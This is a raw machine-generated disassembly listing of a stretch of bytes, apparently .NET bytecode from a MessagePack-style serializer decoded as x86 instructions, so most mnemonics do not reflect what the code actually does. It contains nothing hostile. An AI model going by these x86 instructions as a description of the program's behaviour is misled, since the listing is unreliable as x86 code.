  403bb3:	06                   	push   %es
  403bb4:	02 18                	add    (%eax),%bl
  403bb6:	7d 24                	jge    0x403bdc
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 16                	add    $0x16,%al
  403bbc:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403bc1:	3a 00                	cmp    (%eax),%al
  403bc3:	00 06                	add    %al,(%esi)
  403bc5:	25 03 28 64 00       	and    $0x642803,%eax
  403bca:	00 06                	add    %al,(%esi)
  403bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bcd:	38 00                	cmp    %al,(%eax)
  403bcf:	00 06                	add    %al,(%esi)
  403bd1:	03 6f 56             	add    0x56(%edi),%ebp
  403bd4:	00 00                	add    %al,(%eax)
  403bd6:	06                   	push   %es
  403bd7:	09 17                	or     %edx,(%edi)
  403bd9:	58                   	pop    %eax
  403bda:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403bdf:	2a 06                	sub    (%esi),%al
  403be1:	20 da                	and    %bl,%dl
  403be3:	00 00                	add    %al,(%eax)
  403be5:	00 33                	add    %dh,(%ebx)
  403be7:	0e                   	push   %cs
  403be8:	02 06                	add    (%esi),%al
  403bea:	03 28                	add    (%eax),%ebp
  403bec:	65 00 00             	add    %al,%gs:(%eax)
  403bef:	06                   	push   %es
  403bf0:	28 4f 00             	sub    %cl,0x0(%edi)
  403bf3:	00 06                	add    %al,(%esi)
  403bf5:	2a 06                	sub    (%esi),%al
  403bf7:	20 db                	and    %bl,%bl
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 33                	add    %dh,(%ebx)
  403bfd:	0e                   	push   %cs
  403bfe:	02 06                	add    (%esi),%al
  403c00:	03 28                	add    (%eax),%ebp
  403c02:	65 00 00             	add    %al,%gs:(%eax)
  403c05:	06                   	push   %es
  403c06:	28 4f 00             	sub    %cl,0x0(%edi)
  403c09:	00 06                	add    %al,(%esi)
  403c0b:	2a 06                	sub    (%esi),%al
  403c0d:	20 d0                	and    %dl,%al
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	00 33                	add    %dh,(%ebx)
  403c13:	0f 02 03             	lar    (%ebx),%eax
  403c16:	6f                   	outsl  %ds:(%esi),(%dx)
  403c17:	7a 00                	jp     0x403c19
  403c19:	00 0a                	add    %cl,(%edx)
  403c1b:	67 6a 28             	addr16 push $0x28
  403c1e:	42                   	inc    %edx
  403c1f:	00 00                	add    %al,(%eax)
  403c21:	06                   	push   %es
  403c22:	2a 06                	sub    (%esi),%al
  403c24:	20 d1                	and    %dl,%cl
  403c26:	00 00                	add    %al,(%eax)
  403c28:	00 33                	add    %dh,(%ebx)
  403c2a:	27                   	daa
  403c2b:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403c31:	0b 03                	or     (%ebx),%eax
  403c33:	07                   	pop    %es
  403c34:	16                   	push   %ss
  403c35:	18 6f 45             	sbb    %ch,0x45(%edi)
  403c38:	00 00                	add    %al,(%eax)
  403c3a:	0a 26                	or     (%esi),%ah
  403c3c:	07                   	pop    %es
  403c3d:	28 26                	sub    %ah,(%esi)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	06                   	push   %es
  403c42:	0b 02                	or     (%edx),%eax
  403c44:	07                   	pop    %es
  403c45:	16                   	push   %ss
  403c46:	28 81 00 00 0a 6a    	sub    %al,0x6a0a0000(%ecx)
  403c4c:	28 42 00             	sub    %al,0x0(%edx)
  403c4f:	00 06                	add    %al,(%esi)
  403c51:	2a 06                	sub    (%esi),%al
  403c53:	20 d2                	and    %dl,%dl
  403c55:	00 00                	add    %al,(%eax)
  403c57:	00 33                	add    %dh,(%ebx)
  403c59:	27                   	daa
  403c5a:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403c60:	0b 03                	or     (%ebx),%eax
  403c62:	07                   	pop    %es
  403c63:	16                   	push   %ss
  403c64:	1a 6f 45             	sbb    0x45(%edi),%ch
  403c67:	00 00                	add    %al,(%eax)
  403c69:	0a 26                	or     (%esi),%ah
  403c6b:	07                   	pop    %es
  403c6c:	28 26                	sub    %ah,(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	06                   	push   %es
  403c71:	0b 02                	or     (%edx),%eax
  403c73:	07                   	pop    %es
  403c74:	16                   	push   %ss
  403c75:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403c79:	0a 6a 28             	or     0x28(%edx),%ch
  403c7c:	42                   	inc    %edx
  403c7d:	00 00                	add    %al,(%eax)
  403c7f:	06                   	push   %es
  403c80:	2a 06                	sub    (%esi),%al
  403c82:	20 d3                	and    %dl,%bl
  403c84:	00 00                	add    %al,(%eax)
  403c86:	00 33                	add    %dh,(%ebx)
  403c88:	25 1e 8d 44 00       	and    $0x448d1e,%eax
  403c8d:	00 01                	add    %al,(%ecx)
  403c8f:	0b 03                	or     (%ebx),%eax
  403c91:	07                   	pop    %es
  403c92:	16                   	push   %ss
  403c93:	1e                   	push   %ds
  403c94:	6f                   	outsl  %ds:(%esi),(%dx)
  403c95:	45                   	inc    %ebp
  403c96:	00 00                	add    %al,(%eax)
  403c98:	0a 26                	or     (%esi),%ah
  403c9a:	07                   	pop    %es
  403c9b:	28 26                	sub    %ah,(%esi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	06                   	push   %es
  403ca0:	0b 02                	or     (%edx),%eax
  403ca2:	07                   	pop    %es
  403ca3:	16                   	push   %ss
  403ca4:	28 82 00 00 0a 28    	sub    %al,0x280a0000(%edx)
  403caa:	42                   	inc    %edx
  403cab:	00 00                	add    %al,(%eax)
  403cad:	06                   	push   %es
  403cae:	2a 00                	sub    (%eax),%al
  403cb0:	1b 30                	sbb    (%eax),%esi
  403cb2:	04 00                	add    $0x0,%al
  403cb4:	47                   	inc    %edi
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	00 11                	add    %dl,(%ecx)
  403cb9:	00 00                	add    %al,(%eax)
  403cbb:	11 73 79             	adc    %esi,0x79(%ebx)
  403cbe:	00 00                	add    %al,(%eax)
  403cc0:	0a 0a                	or     (%edx),%cl
  403cc2:	02 06                	add    (%esi),%al
  403cc4:	28 58 00             	sub    %bl,0x0(%eax)
  403cc7:	00 06                	add    %al,(%esi)
  403cc9:	06                   	push   %es
  403cca:	6f                   	outsl  %ds:(%esi),(%dx)
  403ccb:	75 00                	jne    0x403ccd
  403ccd:	00 0a                	add    %cl,(%edx)
  403ccf:	d4 8d                	aam    $0x8d
  403cd1:	44                   	inc    %esp
  403cd2:	00 00                	add    %al,(%eax)
  403cd4:	01 0b                	add    %ecx,(%ebx)
  403cd6:	06                   	push   %es
  403cd7:	16                   	push   %ss
  403cd8:	6a 6f                	push   $0x6f
  403cda:	4e                   	dec    %esi
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a 06                	or     (%esi),%al
  403cdf:	07                   	pop    %es
  403ce0:	16                   	push   %ss
  403ce1:	06                   	push   %es
  403ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce3:	75 00                	jne    0x403ce5
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  403cee:	07                   	pop    %es
  403cef:	28 a1 00 00 06 0c    	sub    %ah,0xc060000(%ecx)
  403cf5:	de 0a                	fimuls (%edx)
  403cf7:	06                   	push   %es
  403cf8:	2c 06                	sub    $0x6,%al
  403cfa:	06                   	push   %es
  403cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfc:	33 00                	xor    (%eax),%eax
  403cfe:	00 0a                	add    %cl,(%edx)
  403d00:	dc 08                	fmull  (%eax)
  403d02:	2a 00                	sub    (%eax),%al
  403d04:	01 10                	add    %edx,(%eax)
  403d06:	00 00                	add    %al,(%eax)
  403d08:	02 00                	add    (%eax),%al
  403d0a:	06                   	push   %es
  403d0b:	00 35 3b 00 0a 00    	add    %dh,0xa003b
  403d11:	00 00                	add    %al,(%eax)
  403d13:	00 13                	add    %dl,(%ebx)
  403d15:	30 02                	xor    %al,(%edx)
  403d17:	00 ec                	add    %ch,%ah
  403d19:	00 00                	add    %al,(%eax)
  403d1b:	00 0b                	add    %cl,(%ebx)
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	11 02                	adc    %eax,(%edx)
  403d21:	7b 24                	jnp    0x403d47
  403d23:	00 00                	add    %al,(%eax)
  403d25:	04 0a                	add    $0xa,%al
  403d27:	06                   	push   %es
  403d28:	45                   	inc    %ebp
  403d29:	0c 00                	or     $0x0,%al
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	05 00 00 00 05       	add    $0x5000000,%eax
  403d32:	00 00                	add    %al,(%eax)
  403d34:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	1e                   	push   %ds
  403d42:	00 00                	add    %al,(%eax)
  403d44:	00 30                	add    %dh,(%eax)
  403d46:	00 00                	add    %al,(%eax)
  403d48:	00 42 00             	add    %al,0x0(%edx)
  403d4b:	00 00                	add    %al,(%eax)
  403d4d:	54                   	push   %esp
  403d4e:	00 00                	add    %al,(%eax)
  403d50:	00 66 00             	add    %ah,0x0(%esi)
  403d53:	00 00                	add    %al,(%eax)
  403d55:	79 00                	jns    0x403d57
  403d57:	00 00                	add    %al,(%eax)
  403d59:	86 00                	xchg   %al,(%eax)
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  403d63:	28 67 00             	sub    %ah,0x0(%edi)
  403d66:	00 06                	add    %al,(%esi)
  403d68:	2a 03                	sub    (%ebx),%al
  403d6a:	02 7b 23             	add    0x23(%ebx),%bh
  403d6d:	00 00                	add    %al,(%eax)
  403d6f:	04 74                	add    $0x74,%al
  403d71:	39 00                	cmp    %eax,(%eax)
  403d73:	00 01                	add    %al,(%ecx)
  403d75:	28 68 00             	sub    %ch,0x0(%eax)
  403d78:	00 06                	add    %al,(%esi)
  403d7a:	2a 03                	sub    (%ebx),%al
  403d7c:	02 7b 23             	add    0x23(%ebx),%bh
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	04 a5                	add    $0xa5,%al
  403d83:	51                   	push   %ecx
  403d84:	00 00                	add    %al,(%eax)
  403d86:	01 28                	add    %ebp,(%eax)
  403d88:	6e                   	outsb  %ds:(%esi),(%dx)
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	06                   	push   %es
  403d8c:	2a 03                	sub    (%ebx),%al
  403d8e:	02 7b 23             	add    0x23(%ebx),%bh
  403d91:	00 00                	add    %al,(%eax)
  403d93:	04 a5                	add    $0xa5,%al
  403d95:	52                   	push   %edx
  403d96:	00 00                	add    %al,(%eax)
  403d98:	01 28                	add    %ebp,(%eax)
  403d9a:	6d                   	insl   (%dx),%es:(%edi)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	06                   	push   %es
  403d9e:	2a 03                	sub    (%ebx),%al
  403da0:	02 7b 23             	add    0x23(%ebx),%bh
  403da3:	00 00                	add    %al,(%eax)
  403da5:	04 a5                	add    $0xa5,%al
  403da7:	5e                   	pop    %esi
  403da8:	00 00                	add    %al,(%eax)
  403daa:	01 28                	add    %ebp,(%eax)
  403dac:	6c                   	insb   (%dx),%es:(%edi)
  403dad:	00 00                	add    %al,(%eax)
  403daf:	06                   	push   %es
  403db0:	2a 03                	sub    (%ebx),%al
  403db2:	02 7b 23             	add    0x23(%ebx),%bh
  403db5:	00 00                	add    %al,(%eax)
  403db7:	04 a5                	add    $0xa5,%al
  403db9:	53                   	push   %ebx
  403dba:	00 00                	add    %al,(%eax)
  403dbc:	01 28                	add    %ebp,(%eax)
  403dbe:	6a 00                	push   $0x0
  403dc0:	00 06                	add    %al,(%esi)
  403dc2:	2a 03                	sub    (%ebx),%al
  403dc4:	02 7b 23             	add    0x23(%ebx),%bh
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	04 a5                	add    $0xa5,%al
  403dcb:	54                   	push   %esp
  403dcc:	00 00                	add    %al,(%eax)
  403dce:	01 6c 28 6a          	add    %ebp,0x6a(%eax,%ebp,1)
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	06                   	push   %es
  403dd5:	2a 03                	sub    (%ebx),%al
  403dd7:	02 28                	add    (%eax),%ch
  403dd9:	45                   	inc    %ebp
  403dda:	00 00                	add    %al,(%eax)
  403ddc:	06                   	push   %es
  403ddd:	28 6e 00             	sub    %ch,0x0(%esi)
  403de0:	00 06                	add    %al,(%esi)
  403de2:	2a 03                	sub    (%ebx),%al
  403de4:	02 7b 23             	add    0x23(%ebx),%bh
  403de7:	00 00                	add    %al,(%eax)
  403de9:	04 74                	add    $0x74,%al
  403deb:	03 00                	add    (%eax),%eax
  403ded:	00 1b                	add    %bl,(%ebx)
  403def:	28 69 00             	sub    %ch,0x0(%ecx)
  403df2:	00 06                	add    %al,(%esi)
  403df4:	2a 02                	sub    (%edx),%al
  403df6:	03 28                	add    (%eax),%ebp
  403df8:	40                   	inc    %eax
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	06                   	push   %es
  403dfc:	2a 02                	sub    (%edx),%al
  403dfe:	03 28                	add    (%eax),%ebp
  403e00:	41                   	inc    %ecx
  403e01:	00 00                	add    %al,(%eax)
  403e03:	06                   	push   %es
  403e04:	2a 03                	sub    (%ebx),%al
  403e06:	28 67 00             	sub    %ah,0x0(%edi)
  403e09:	00 06                	add    %al,(%esi)
  403e0b:	2a 1b                	sub    (%ebx),%bl
  403e0d:	30 03                	xor    %al,(%ebx)
  403e0f:	00 39                	add    %bh,(%ecx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 12                	add    %dl,(%edx)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	11 02                	adc    %eax,(%edx)
  403e19:	0a 16                	or     (%esi),%dl
  403e1b:	0b 06                	or     (%esi),%eax
  403e1d:	12 01                	adc    (%ecx),%al
  403e1f:	28 49 00             	sub    %cl,0x0(%ecx)
  403e22:	00 0a                	add    %cl,(%edx)
  403e24:	02 7b 27             	add    0x27(%ebx),%bh
  403e27:	00 00                	add    %al,(%eax)
  403e29:	04 2d                	add    $0x2d,%al
  403e2b:	12 02                	adc    (%edx),%al
  403e2d:	02 02                	add    (%edx),%al
  403e2f:	7b 26                	jnp    0x403e57
  403e31:	00 00                	add    %al,(%eax)
  403e33:	04 73                	add    $0x73,%al
  403e35:	31 00                	xor    %eax,(%eax)
  403e37:	00 06                	add    %al,(%esi)
  403e39:	7d 27                	jge    0x403e62
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	04 de                	add    $0xde,%al
  403e3f:	0a 07                	or     (%edi),%al
  403e41:	2c 06                	sub    $0x6,%al
  403e43:	06                   	push   %es
  403e44:	28 50 00             	sub    %dl,0x0(%eax)
  403e47:	00 0a                	add    %cl,(%edx)
  403e49:	dc 02                	faddl  (%edx)
  403e4b:	7b 27                	jnp    0x403e74
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	04 2a                	add    $0x2a,%al
  403e51:	00 00                	add    %al,(%eax)
  403e53:	00 01                	add    %al,(%ecx)
  403e55:	10 00                	adc    %al,(%eax)
  403e57:	00 02                	add    %al,(%edx)
  403e59:	00 04 00             	add    %al,(%eax,%eax,1)
  403e5c:	24 28                	and    $0x28,%al
  403e5e:	00 0a                	add    %cl,(%edx)
  403e60:	00 00                	add    %al,(%eax)
  403e62:	00 00                	add    %al,(%eax)
  403e64:	13 30                	adc    (%eax),%esi
  403e66:	04 00                	add    $0x0,%al
  403e68:	18 00                	sbb    %al,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	13 00                	adc    (%eax),%eax
  403e6e:	00 11                	add    %dl,(%ecx)
  403e70:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  403e76:	0a 02                	or     (%edx),%al
  403e78:	06                   	push   %es
  403e79:	16                   	push   %ss
  403e7a:	03 6f 45             	add    0x45(%edi),%ebp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	0a 26                	or     (%esi),%ah
  403e81:	06                   	push   %es
  403e82:	28 23                	sub    %ah,(%ebx)
  403e84:	00 00                	add    %al,(%eax)
  403e86:	06                   	push   %es
  403e87:	2a 13                	sub    (%ebx),%dl
  403e89:	30 04 00             	xor    %al,(%eax,%eax,1)
  403e8c:	99                   	cltd
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403e92:	00 11                	add    %dl,(%ecx)
  403e94:	14 0a                	adc    $0xa,%al
  403e96:	16                   	push   %ss
  403e97:	0b 02                	or     (%edx),%eax
  403e99:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  403e9f:	12 02                	adc    (%edx),%al
  403ea1:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  403ea7:	0a 02                	or     (%edx),%al
  403ea9:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  403eaf:	0b 2b                	or     (%ebx),%ebp
  403eb1:	63 02                	arpl   %eax,(%edx)
  403eb3:	20 d9                	and    %bl,%cl
  403eb5:	00 00                	add    %al,(%eax)
  403eb7:	00 33                	add    %dh,(%ebx)
  403eb9:	09 03                	or     %eax,(%ebx)
  403ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebc:	7a 00                	jp     0x403ebe
  403ebe:	00 0a                	add    %cl,(%edx)
  403ec0:	0b 2b                	or     (%ebx),%ebp
  403ec2:	52                   	push   %edx
  403ec3:	02 20                	add    (%eax),%ah
  403ec5:	da 00                	fiaddl (%eax)
  403ec7:	00 00                	add    %al,(%eax)
  403ec9:	33 22                	xor    (%edx),%esp
  403ecb:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ed1:	0a 03                	or     (%ebx),%al
  403ed3:	06                   	push   %es
  403ed4:	16                   	push   %ss
  403ed5:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ed8:	00 00                	add    %al,(%eax)
  403eda:	0a 26                	or     (%esi),%ah
  403edc:	06                   	push   %es
  403edd:	28 26                	sub    %ah,(%esi)
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	06                   	push   %es
  403ee2:	0a 06                	or     (%esi),%al
  403ee4:	16                   	push   %ss
  403ee5:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403ee9:	0a 0b                	or     (%ebx),%cl
  403eeb:	2b 28                	sub    (%eax),%ebp
  403eed:	02 20                	add    (%eax),%ah
  403eef:	db 00                	fildl  (%eax)
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	33 20                	xor    (%eax),%esp
  403ef5:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403efb:	0a 03                	or     (%ebx),%al
  403efd:	06                   	push   %es
  403efe:	16                   	push   %ss
  403eff:	1a 6f 45             	sbb    0x45(%edi),%ch
  403f02:	00 00                	add    %al,(%eax)
  403f04:	0a 26                	or     (%esi),%ah
  403f06:	06                   	push   %es
  403f07:	28 26                	sub    %ah,(%esi)
  403f09:	00 00                	add    %al,(%eax)
  403f0b:	06                   	push   %es
  403f0c:	0a 06                	or     (%esi),%al
  403f0e:	16                   	push   %ss
  403f0f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403f13:	0a 0b                	or     (%ebx),%cl
  403f15:	07                   	pop    %es
  403f16:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403f1a:	01 0a                	add    %ecx,(%edx)
  403f1c:	03 06                	add    (%esi),%eax
  403f1e:	16                   	push   %ss
  403f1f:	07                   	pop    %es
  403f20:	6f                   	outsl  %ds:(%esi),(%dx)
  403f21:	45                   	inc    %ebp
  403f22:	00 00                	add    %al,(%eax)
  403f24:	0a 26                	or     (%esi),%ah
  403f26:	06                   	push   %es
  403f27:	28 23                	sub    %ah,(%ebx)
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	2a 00                	sub    (%eax),%al
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	13 30                	adc    (%eax),%esi
  403f32:	04 00                	add    $0x0,%al
  403f34:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403f35:	00 00                	add    %al,(%eax)
  403f37:	00 15 00 00 11 03    	add    %dl,0x3110000
  403f3d:	28 22                	sub    %ah,(%edx)
  403f3f:	00 00                	add    %al,(%eax)
  403f41:	06                   	push   %es
  403f42:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  403f45:	06                   	push   %es
  403f46:	8e 69 0c             	mov    0xc(%ecx),%gs
  403f49:	16                   	push   %ss
  403f4a:	0d 08 1f 1f 30       	or     $0x301f1f08,%eax
  403f4f:	13 20                	adc    (%eax),%esp
  403f51:	a0 00 00 00 08       	mov    0x8000000,%al
  403f56:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  403f59:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f5e:	00 00                	add    %al,(%eax)
  403f60:	0a 2b                	or     (%ebx),%ch
  403f62:	74 08                	je     0x403f6c
  403f64:	20 ff                	and    %bh,%bh
  403f66:	00 00                	add    %al,(%eax)
  403f68:	00 30                	add    %dh,(%eax)
  403f6a:	19 20                	sbb    %esp,(%eax)
  403f6c:	d9 00                	flds   (%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f75:	00 00                	add    %al,(%eax)
  403f77:	0a 08                	or     (%eax),%cl
  403f79:	d2 0d 02 09 6f 62    	rorb   %cl,0x626f0902
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	0a 2b                	or     (%ebx),%ch
  403f83:	53                   	push   %ebx
  403f84:	08 20                	or     %ah,(%eax)
  403f86:	ff                   	(bad)
  403f87:	ff 00                	incl   (%eax)
  403f89:	00 30                	add    %dh,(%eax)
  403f8b:	27                   	daa
  403f8c:	20 da                	and    %bl,%dl
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	00 0d 02 09 6f 62    	add    %cl,0x626f0902
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 08                	or     (%eax),%cl
  403f9a:	68 28 63 00 00       	push   $0x6328
  403f9f:	0a 28                	or     (%eax),%ch
  403fa1:	26 00 00             	add    %al,%es:(%eax)
  403fa4:	06                   	push   %es
  403fa5:	0b 02                	or     (%edx),%eax
  403fa7:	07                   	pop    %es
  403fa8:	16                   	push   %ss
  403fa9:	07                   	pop    %es
  403faa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fad:	4c                   	dec    %esp
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	0a 2b                	or     (%ebx),%ch
  403fb2:	24 20                	and    $0x20,%al
  403fb4:	db 00                	fildl  (%eax)
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	0a 08                	or     (%eax),%cl
  403fc1:	28 4a 00             	sub    %cl,0x0(%edx)
  403fc4:	00 0a                	add    %cl,(%edx)
  403fc6:	28 26                	sub    %ah,(%esi)
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	06                   	push   %es
  403fcb:	0b 02                	or     (%edx),%eax
  403fcd:	07                   	pop    %es
  403fce:	16                   	push   %ss
  403fcf:	07                   	pop    %es
  403fd0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fd3:	4c                   	dec    %esp
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	0a 02                	or     (%edx),%al
  403fd8:	06                   	push   %es
  403fd9:	16                   	push   %ss
  403fda:	06                   	push   %es
  403fdb:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fde:	4c                   	dec    %esp
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	0a 2a                	or     (%edx),%ch
  403fe3:	00 13                	add    %dl,(%ebx)
  403fe5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403fe8:	88 00                	mov    %al,(%eax)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	16                   	push   %ss
  403fed:	00 00                	add    %al,(%eax)
  403fef:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403ff2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  403ff8:	07                   	pop    %es
  403ff9:	20 ff                	and    %bh,%bh
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	00 30                	add    %dh,(%eax)
  403fff:	19 20                	sbb    %esp,(%eax)
  404001:	c4 00                	les    (%eax),%eax
  404003:	00 00                	add    %al,(%eax)
  404005:	0c 02                	or     $0x2,%al
  404007:	08 6f 62             	or     %ch,0x62(%edi)
  40400a:	00 00                	add    %al,(%eax)
  40400c:	0a 07                	or     (%edi),%al
  40400e:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  404011:	08 6f 62             	or     %ch,0x62(%edi)
  404014:	00 00                	add    %al,(%eax)
  404016:	0a 2b                	or     (%ebx),%ch
  404018:	53                   	push   %ebx
  404019:	07                   	pop    %es
  40401a:	20 ff                	and    %bh,%bh
  40401c:	ff 00                	incl   (%eax)
  40401e:	00 30                	add    %dh,(%eax)
  404020:	27                   	daa
  404021:	20 c5                	and    %al,%ch
  404023:	00 00                	add    %al,(%eax)
  404025:	00 0c 02             	add    %cl,(%edx,%eax,1)
  404028:	08 6f 62             	or     %ch,0x62(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	0a 07                	or     (%edi),%al
  40402f:	68 28 63 00 00       	push   $0x6328
  404034:	0a 28                	or     (%eax),%ch
  404036:	26 00 00             	add    %al,%es:(%eax)
  404039:	06                   	push   %es
  40403a:	0a 02                	or     (%edx),%al
  40403c:	06                   	push   %es
  40403d:	16                   	push   %ss
  40403e:	06                   	push   %es
  40403f:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404042:	4c                   	dec    %esp
  404043:	00 00                	add    %al,(%eax)
  404045:	0a 2b                	or     (%ebx),%ch
  404047:	24 20                	and    $0x20,%al
  404049:	c6 00 00             	movb   $0x0,(%eax)
  40404c:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40404f:	08 6f 62             	or     %ch,0x62(%edi)
  404052:	00 00                	add    %al,(%eax)
  404054:	0a 07                	or     (%edi),%al
  404056:	28 4a 00             	sub    %cl,0x0(%edx)
  404059:	00 0a                	add    %cl,(%edx)
  40405b:	28 26                	sub    %ah,(%esi)
  40405d:	00 00                	add    %al,(%eax)
  40405f:	06                   	push   %es
  404060:	0a 02                	or     (%edx),%al
  404062:	06                   	push   %es
  404063:	16                   	push   %ss
  404064:	06                   	push   %es
  404065:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404068:	4c                   	dec    %esp
  404069:	00 00                	add    %al,(%eax)
  40406b:	0a 02                	or     (%edx),%al
  40406d:	03 16                	add    (%esi),%edx
  40406f:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404075:	00 0a                	add    %cl,(%edx)
  404077:	2a 13                	sub    (%ebx),%dl
  404079:	30 04 00             	xor    %al,(%eax,%eax,1)
  40407c:	21 00                	and    %eax,(%eax)
  40407e:	00 00                	add    %al,(%eax)
  404080:	13 00                	adc    (%eax),%eax
  404082:	00 11                	add    %dl,(%ecx)
  404084:	02 20                	add    (%eax),%ah
  404086:	cf                   	iret
  404087:	00 00                	add    %al,(%eax)
  404089:	00 6f 62             	add    %ch,0x62(%edi)
  40408c:	00 00                	add    %al,(%eax)
  40408e:	0a 03                	or     (%ebx),%al
  404090:	28 84 00 00 0a 0a 02 	sub    %al,0x20a0a00(%eax,%eax,1)
  404097:	06                   	push   %es
  404098:	28 26                	sub    %ah,(%esi)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	06                   	push   %es
  40409d:	16                   	push   %ss
  40409e:	1e                   	push   %ds
  40409f:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a0:	4c                   	dec    %esp
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 2a                	or     (%edx),%ch
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	00 13                	add    %dl,(%ebx)
  4040a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040ac:	1d 01 00 00 00       	sbb    $0x1,%eax
  4040b1:	00 00                	add    %al,(%eax)
  4040b3:	00 03                	add    %al,(%ebx)
  4040b5:	16                   	push   %ss
  4040b6:	6a 3f                	push   $0x3f
  4040b8:	8a 00                	mov    (%eax),%al
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	03 1f                	add    (%edi),%ebx
  4040be:	7f 6a                	jg     0x40412a
  4040c0:	30 09                	xor    %cl,(%ecx)
  4040c2:	02 03                	add    (%ebx),%al
  4040c4:	d2 6f 62             	shrb   %cl,0x62(%edi)
  4040c7:	00 00                	add    %al,(%eax)
  4040c9:	0a 2a                	or     (%edx),%ch
  4040cb:	03 20                	add    (%eax),%esp
  4040cd:	ff 00                	incl   (%eax)
  4040cf:	00 00                	add    %al,(%eax)
  4040d1:	6a 30                	push   $0x30
  4040d3:	14 02                	adc    $0x2,%al
  4040d5:	20 cc                	and    %cl,%ah
  4040d7:	00 00                	add    %al,(%eax)
  4040d9:	00 6f 62             	add    %ch,0x62(%edi)
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	0a 02                	or     (%edx),%al
  4040e0:	03 d2                	add    %edx,%edx
  4040e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e3:	62 00                	bound  %eax,(%eax)
  4040e5:	00 0a                	add    %cl,(%edx)
  4040e7:	2a 03                	sub    (%ebx),%al
  4040e9:	20 ff                	and    %bh,%bh
  4040eb:	ff 00                	incl   (%eax)
